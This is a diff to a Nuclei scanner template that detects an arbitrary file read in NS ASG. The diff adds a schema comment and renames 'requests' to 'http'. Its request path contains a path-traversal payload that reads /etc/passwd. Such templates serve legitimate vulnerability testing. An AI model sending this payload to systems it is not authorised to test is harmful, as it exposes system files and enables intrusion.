@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: nsasg-arbitrary-file-read
 info:
   name: NS ASG Arbitrary File Read
@@ -5,7 +6,7 @@ info:
   severity: high
   reference: https://zhuanlan.zhihu.com/p/368054963
   tags: nsasg,lfi
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd"
